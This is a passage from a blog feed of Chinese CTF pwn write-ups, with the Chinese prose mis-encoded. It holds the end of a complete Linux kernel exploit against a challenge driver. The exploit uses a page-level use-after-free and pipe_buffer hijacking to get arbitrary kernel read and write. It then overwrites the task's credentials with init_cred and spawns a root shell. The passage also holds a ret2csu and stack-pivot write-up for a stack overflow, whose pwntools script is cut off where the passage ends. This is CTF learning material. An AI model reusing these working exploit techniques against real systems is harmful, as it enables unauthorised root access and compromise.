class="line">    <span class="keyword">if</span> (page_ptr == evil_pipe_buf.page) &#123;</span><br><span class="line">      self_pipe_idx_4 = i;</span><br><span class="line">      <span class="built_in">log_info</span>(<span class="string">&quot;Found self pipe 4: %d&quot;</span>, self_pipe_idx_4);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (self_pipe_idx_4 == <span class="number">-1</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;FAILED to build a self-writing pipe 4!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;find self rw pipe 2 3 4 successfully&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">setup_evil_pipe</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;set up 2 3 4 pipe buffer&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_2, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_3, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;evil_pipe_buf_4, &amp;info_pipe_buf, <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0xff8</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* hijack 3 -&gt; 4 */</span></span><br><span class="line">  evil_pipe_buf_3.offset = TRD_PIPE_BUFS_SIZE * <span class="number">3</span>;</span><br><span class="line">  evil_pipe_buf_3.len = <span class="number">0</span>;</span><br><span class="line">  <span class="comment">// ?? å†™4</span></span><br><span class="line">  <span class="comment">// å› ä¸ºå†™ pipe æ—¶ä» offset + len å¼€å§‹å†™ï¼Œå°±æ˜¯å†™å…¥3ä¸­</span></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;hijack pipe 3 to write pipe 4&quot;</span>);</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  evil_pipe_buf_4.offset = TRD_PIPE_BUFS_SIZE;</span><br><span class="line">  evil_pipe_buf_4.len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_read</span><span class="params">(<span class="keyword">struct</span> page *page_to_read, <span class="type">void</span> *dst)</span> </span>&#123;</span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0x1ff8</span>;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_read;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line">  <span class="comment">/* read 2 */</span></span><br><span class="line">  <span class="built_in">read</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">0</span>], dst, <span class="number">0xfff</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">pipe_arb_write</span><span class="params">(<span class="keyword">struct</span> page *page_to_write, <span class="type">void</span> *src, <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">  evil_pipe_buf_2.page = page_to_write;</span><br><span class="line">  evil_pipe_buf_2.offset = <span class="number">0</span>;</span><br><span class="line">  evil_pipe_buf_2.len = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* use 3 wrtite 4 to make 4-&gt;2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_3][<span class="number">1</span>], &amp;evil_pipe_buf_4,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_4));</span><br><span class="line">  <span class="comment">/* use 4 write 2 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_2,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], temp_zero_buf,</span><br><span class="line">        TRD_PIPE_BUFS_SIZE - <span class="built_in">sizeof</span>(evil_pipe_buf_2));</span><br><span class="line">  <span class="comment">/* use 4 write 3 */</span></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_4][<span class="number">1</span>], &amp;evil_pipe_buf_3,</span><br><span class="line">        <span class="built_in">sizeof</span>(evil_pipe_buf_3));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">write</span>(spray_pipe_fd[self_pipe_idx_2][<span class="number">1</span>], src, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> *tsk_buf, current_task_page, current_task, parent_task, buf[<span class="number">0x1000</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">info_leak</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;info leak&quot;</span>);</span><br><span class="line">  <span class="type">size_t</span> *comm_addr;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="built_in">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;setup kernel arbitrary read &amp; write...&quot;</span>);</span><br><span class="line">  <span class="built_in">setup_evil_pipe</span>();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;leaking something by search memory&quot;</span>);</span><br><span class="line">  vmemmap_base = (<span class="type">size_t</span>)info_pipe_buf.page &amp; <span class="number">0xfffffffff0000000</span>;</span><br><span class="line">  <span class="comment">// log_info(&quot;vmemmap_base: %#lx&quot;, vmemmap_base);</span></span><br><span class="line">  <span class="comment">// debug(&quot;vmemmap_base&quot;);</span></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + <span class="number">157</span> * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (buf[<span class="number">0</span>] &gt; <span class="number">0xffffffff81000000</span> &amp;&amp; ((buf[<span class="number">0</span>] &amp; <span class="number">0xfff</span>) == <span class="number">0x070</span>)) &#123;</span><br><span class="line">      kernel_base = buf[<span class="number">0</span>] - <span class="number">0x070</span>;</span><br><span class="line">      kernel_offset = kernel_base - <span class="number">0xffffffff81000000</span>;</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;Found kernel base: %#lx\n\t\t&quot;</span></span><br><span class="line">          <span class="string">&quot;Kernel offset: %#lx&quot;</span>,</span><br><span class="line">          kernel_base, kernel_offset);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    vmemmap_base -= <span class="number">0x10000000</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;vmemmap_base: %#lx&quot;</span>, vmemmap_base);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">log_info</span>(<span class="string">&quot;seek task_struct in memory...&quot;</span>);</span><br><span class="line">  <span class="built_in">prctl</span>(PR_SET_NAME, <span class="string">&quot;waterkernelpwn&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; <span class="number">1</span>; i++) &#123;</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>), buf);</span><br><span class="line"></span><br><span class="line">    comm_addr = <span class="built_in">memmem</span>(buf, <span class="number">0xf00</span>, <span class="string">&quot;waterkernelpwn&quot;</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="number">-2</span>] &gt; <span class="number">0xffff888000000000</span>) <span class="comment">/* task-&gt;cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-3</span>] &gt; <span class="number">0xffff888000000000</span>)           <span class="comment">/* task-&gt;real_cred */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-57</span>] &gt; <span class="number">0xffff888000000000</span>)    <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">        &amp;&amp; (comm_addr[<span class="number">-56</span>] &gt; <span class="number">0xffff888000000000</span>)) &#123; <span class="comment">/* task-&gt;parent */</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task-&gt;read_parent */</span></span><br><span class="line">      parent_task = comm_addr[<span class="number">-57</span>];</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* task_struct::ptraced */</span></span><br><span class="line">      current_task = comm_addr[<span class="number">-50</span>] - <span class="number">2528</span>;</span><br><span class="line"></span><br><span class="line">      page_offset_base = (comm_addr[<span class="number">-50</span>] &amp; <span class="number">0xfffffffffffff000</span>) - i * <span class="number">0x1000</span>;</span><br><span class="line">      page_offset_base &amp;= <span class="number">0xfffffffff0000000</span>;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n&quot;</span>,</span><br><span class="line">             (<span class="keyword">struct</span> page *)(vmemmap_base + i * <span class="number">0x40</span>));</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m%#lx\n&quot;</span>,</span><br><span class="line">             page_offset_base);</span><br><span class="line">      <span class="built_in">printf</span>(</span><br><span class="line">          <span class="string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span></span><br><span class="line">          <span class="string">&quot;%#lx\n\n&quot;</span>,</span><br><span class="line">          current_task);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">get_root_shell</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">getuid</span>()) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[31m\033[1m[x] Failed to get the root!\033[0m&quot;</span>);</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful to get the root. \033[0m&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Execve root shell now...\033[0m&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">system</span>(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">size_t</span> <span class="title">direct_map_addr_to_page_addr</span><span class="params">(<span class="type">size_t</span> direct_map_addr)</span> </span>&#123;</span><br><span class="line">  <span class="type">size_t</span> page_count;</span><br><span class="line"></span><br><span class="line">  page_count = ((direct_map_addr &amp; (~<span class="number">0xfff</span>)) - page_offset_base) / <span class="number">0x1000</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> vmemmap_base + page_count * <span class="number">0x40</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">privilege_escalation_by_task_overwrite</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* finding the init_task, the final parent of every task */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Seeking for init_task...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    <span class="type">size_t</span> ptask_page_addr = <span class="built_in">direct_map_addr_to_page_addr</span>(parent_task);</span><br><span class="line"></span><br><span class="line">    tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (parent_task &amp; <span class="number">0xfff</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)ptask_page_addr, buf);</span><br><span class="line">    <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(ptask_page_addr + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* task_struct::real_parent */</span></span><br><span class="line">    <span class="keyword">if</span> (parent_task == tsk_buf[<span class="number">309</span>]) &#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    parent_task = tsk_buf[<span class="number">309</span>];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  init_task = parent_task;</span><br><span class="line">  init_cred = tsk_buf[<span class="number">363</span>];</span><br><span class="line">  init_nsproxy = tsk_buf[<span class="number">377</span>];</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>, init_nsproxy);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* now, changing the current task_struct to get the full root :) */</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  current_task_page = <span class="built_in">direct_map_addr_to_page_addr</span>(current_task);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)current_task_page, buf);</span><br><span class="line">  <span class="built_in">pipe_arb_read</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>]);</span><br><span class="line"></span><br><span class="line">  tsk_buf = (<span class="type">size_t</span> *)((<span class="type">size_t</span>)buf + (current_task &amp; <span class="number">0xfff</span>));</span><br><span class="line">  tsk_buf[<span class="number">363</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">364</span>] = init_cred;</span><br><span class="line">  tsk_buf[<span class="number">377</span>] = init_nsproxy;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)current_task_page, buf, <span class="number">0xff0</span>);</span><br><span class="line">  <span class="built_in">pipe_arb_write</span>((<span class="keyword">struct</span> page *)(current_task_page + <span class="number">0x40</span>), &amp;buf[<span class="number">512</span>], <span class="number">0xff0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[+] Done.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*] checking for root...&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">get_root_shell</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">bind_core</span><span class="params">(<span class="type">int</span> core)</span> </span>&#123;</span><br><span class="line">  <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">CPU_ZERO</span>(&amp;cpu_set);</span><br><span class="line">  <span class="built_in">CPU_SET</span>(core, &amp;cpu_set);</span><br><span class="line">  <span class="built_in">sched_setaffinity</span>(<span class="built_in">getpid</span>(), <span class="built_in">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Process binded to core \033[0m%d\n&quot;</span>, core);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">bind_core</span>(<span class="number">0</span>);</span><br><span class="line">  dev_fd = <span class="built_in">open</span>(<span class="string">&quot;/dev/water&quot;</span>, O_RDWR);</span><br><span class="line">  <span class="keyword">if</span> (dev_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">err_exit</span>(<span class="string">&quot;open /dev/water&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">second_page_level_uaf</span>();</span><br><span class="line">  <span class="built_in">construct_self_pipe</span>();</span><br><span class="line">  <span class="built_in">info_leak</span>();</span><br><span class="line">  <span class="built_in">privilege_escalation_by_task_overwrite</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç­‰å“ªå¤©å¿ƒè¡€æ¥æ½®åœ¨åšä¸€éå§</p><h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul><li><a href="https://www.52pojie.cn/thread-1795570-1-1.html">Linux kernel å †æº¢å‡ºæ¼æ´åˆ†æä¸åˆ©ç”¨</a></li><li><a href="https://arttnba3.cn/2023/05/02/CTF-0X08_D3CTF2023_D3KCACHE/">D^ 3CTF2023 d3kcache å‡ºé¢˜æ‰‹è®° - arttnba3â€™s blog</a></li><li><a href="https://blog.xmcve.com/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023-Writeup/#title-8">æ˜Ÿç›Ÿï¼šå¼ºç½‘æ‹Ÿæ€2023 Writeup</a></li><li><a href="https://mp.weixin.qq.com/s/Ls-PQ3VtVRiKRXwHWTQIwA">DJBï¼š2023å¼ºç½‘æ‹Ÿæ€é¢„èµ› WP</a></li><li><a href="https://mp.weixin.qq.com/s/3vaT1gJBagSjovJZNZaR-g">El3ctronicï¼šç¬¬å…­å±Šâ€œå¼ºç½‘â€æ‹Ÿæ€</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é¹ç¨‹æ¯</title>
      <link href="/2023/11/04/%E9%B9%8F%E7%A8%8B%E6%9D%AF%20CTF/"/>
      <url>/2023/11/04/%E9%B9%8F%E7%A8%8B%E6%9D%AF%20CTF/</url>
      
        <content type="html"><![CDATA[<blockquote><p>CTF PWN</p></blockquote><span id="more"></span><p>è°ƒè¯•æ—¶å»é™¤alarmå‡½æ•°ï¼šä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨ï¼Œå°†æ‰€æœ‰çš„alarmæ”¹æˆ <code>isnan</code></p><p>æˆ–è€…ä½¿ç”¨å‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i s/alarm/isnan/g &lt;äºŒè¿›åˆ¶æ–‡ä»¶&gt;</span><br></pre></td></tr></table></figure><h2 id="slient"><a href="#slient" class="headerlink" title="slient"></a>slient</h2><p>å¼€å¯PIEå’ŒNXä¿æŠ¤ï¼Œæ¼æ´ç‚¹æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">64</span>]; <span class="comment">// [rsp+10h] [rbp-40h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">init_seccomp</span>(argc, argv, envp);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdin, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰putsï¼Œwriteç­‰å¯ä»¥è¿›è¡Œæ³„éœ²çš„å‡½æ•°ã€‚æ€è·¯ä¸ºå°†æŸäº›å‡½æ•°çš„gotè¡¨è¯»å…¥bssæ®µï¼Œä½¿ç”¨ret2csuã€‚</p><ul><li>è¯»gotè¡¨éœ€è¦gadgetè‡³å°‘å­˜åœ¨å¯ä»¥ä¿®æ”¹åœ°å€å†…å®¹ç‰‡æ®µï¼Œå½¢å¦‚ <code>mov [xxx], xxx</code> ã€‚ç”¨äºå–å€¼ï¼Œè€Œä¸”éœ€è¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶å¯„å­˜å™¨çš„å†…å®¹</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ROPgadget --binary silent</span><br><span class="line">0x00000000004007e8 : add dword ptr [rbp - 0x3d], ebx ; nop dword ptr [rax + rax] ; repz ret</span><br></pre></td></tr></table></figure><ol><li>æ ˆæº¢å‡ºï¼Œä½¿ç”¨ret2csuï¼Œå‘bssæ®µè¯»å…¥ROP chainã€‚</li><li>æ ˆè¿ç§»ï¼Œè½¬åˆ°bssæ®µçš„ROPchainæ‰§è¡Œ</li></ol><ul><li>ä½¿ç”¨magic ä¿®æ”¹read_got è¡¨å†…å®¹ä¸ºsyscall</li><li>æ³„éœ²å‡ºlibc_base</li><li>ç»§ç»­read ROPchianï¼Œæ ˆè¿ç§»æ‰§è¡ŒROPchain</li></ul><p>éœ€è¦æ³¨æ„</p><ul><li>å–magic gadgetä¸­çš„ebxæ—¶ï¼Œå¦‚æœebxçš„å€¼ä¸ºæ­£ï¼Œåˆ™ç›´æ¥å–ï¼Œå¦‚æœä¸º<strong>è´Ÿï¼ŒåŠ 0x100000000å–è¡¥ç </strong>ã€‚</li><li>æ§åˆ¶raxï¼Œä½¿ç”¨å‡½æ•°è¿”å›å€¼æ˜¯raxæ¥æ§åˆ¶</li><li>æ ˆè¿ç§»çš„é‡ç‚¹æ˜¯æ§åˆ¶rspï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ pop_rsp ç›´æ¥æ§åˆ¶ã€‚</li></ul><p>æœ€ç»ˆçš„exp</p><ul><li>è°ƒè¯•äºŒä¸‰åæ¬¡æ‰æ˜ç™½ï¼Œ<del>ä½†æ˜¯å¾ˆå¿«å°±ä¼šå¿˜</del>ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s</span>(<span class="params">data</span>): <span class="keyword">return</span> p.send(data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">r</span>(<span class="params">num=<span class="number">4096</span></span>): <span class="keyword">return</span> p.recv(num)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ru</span>(<span class="params">delim, drop=<span class="literal">False</span></span>): <span class="keyword">return</span> p.recvuntil(delim, drop)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">itr</span>(): <span class="keyword">return</span> p.interactive()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">name</span>): <span class="keyword">return</span> log.success(</span><br><span class="line">    <span class="string">&#x27;\033[32m%s ==&gt; 0x%x\033[0m&#x27;</span> % (name, <span class="built_in">eval</span>(name)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">uu64</span>(): <span class="keyword">return</span> u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">p</span>): gdb.attach(p)</span><br><span class="line"></span><br><span class="line">file = <span class="string">&#x27;silent_patched&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(file, checksec=<span class="literal">False</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">context.binary = elf</span><br><span 